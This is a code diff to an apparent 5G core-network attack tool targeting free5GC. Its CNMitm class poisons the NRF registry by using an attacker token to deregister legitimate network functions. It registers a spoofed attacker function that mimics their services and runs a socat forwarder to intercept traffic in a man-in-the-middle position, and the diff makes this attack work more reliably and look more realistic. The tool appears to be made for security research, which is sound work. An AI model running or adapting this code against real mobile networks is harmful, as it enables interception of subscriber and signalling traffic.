@@ -1,5 +1,5 @@
 
-from src.utils.common import get_ip_from_iface, generate_variables
+from src.utils.common import get_my_ip_from_prefix, generate_variables, ip_list
 from src.utils.protocols.api_cn.instance import NFInstance
 
 import random
@@ -28,14 +28,20 @@ class CNMitm:
         if "nfInstances" not in infos or not infos["nfInstances"]:
             return False
 
-        # Remove the legitimate instances but store their informations for later 
+        # Remove the legitimate instances but store their informations for adding them back later 
         removed_instances: list[NFInstance] = []
         for legitimate_instance in infos["nfInstances"]:
             
             legitimate_id = legitimate_instance["nfInstanceId"]
             legitimate_address = legitimate_instance["ipv4Addresses"][0]
-            legitimate_services = [s["serviceName"] for s in legitimate_instance["nfServices"]]
             
+            # Some NF don't have services
+            if "nfServices" in legitimate_instance:
+                legitimate_services = [s["serviceName"] for s in legitimate_instance["nfServices"]]
+            else : 
+                legitimate_services = []
+            
+            # Create instance object and add them to a list
             legitimate_instance = NFInstance(legitimate_id, nf_to_spoof, legitimate_address, legitimate_services)
             removed = legitimate_instance.remove_nf(CNMitm.attacker_token)
             removed_instances.append(legitimate_instance)
@@ -44,16 +50,18 @@ class CNMitm:
                 return False
 
         # Informations for the new attacker NF
-        mitm_addr = get_ip_from_iface("evil","eth0")
+        mitm_addr = get_my_ip_from_prefix("140.")
         mitm_id   = generate_variables("uuid")
-        
-        random_instance: NFInstance = random.choices(legitimate_instance)
+                
+        # Pick a random legitimate removed instance and mimic some of its services
+        # Its just to make the mitm instance more realistic
+        random_instance: NFInstance = random.choice(removed_instances)
         nb_of_service = random.randint(1, len(random_instance.services))  
         mitm_services = random.sample(random_instance.services, nb_of_service) # get N services from a random instance
         CNMitm.spoofed_instance = random_instance
         
         # Add the attacker as a NF of the right type
-        CNMitm.mitm_instance = NFInstance.add_nf(mitm_id, nf_to_spoof, mitm_services, ip_address=mitm_addr, display=True)
+        CNMitm.mitm_instance = NFInstance.add_nf(mitm_id, nf_to_spoof, mitm_services, ip_address=mitm_addr)
         
         # Re-add the legitimate NFs
         for i in removed_instances:
@@ -84,8 +92,10 @@ class CNMitm:
         if not CNMitm._nrf_poisonning(nf_to_spoof):
             return False
         
+        # The MITM redirect every incoming message to the legitimate NF
         free5gc_cn_port = 8000
-        os.popen(f"socat TCP4-LISTEN:{free5gc_cn_port},fork TCP4:{CNMitm.spoofed_instance.ip_address}:{free5gc_cn_port}")
+        legitimate_nf_ip = ip_list[CNMitm.spoofed_instance.nf_type]
+        os.popen(f"socat TCP4-LISTEN:{free5gc_cn_port},fork TCP4:{legitimate_nf_ip}:{free5gc_cn_port}")
 
         return True
 
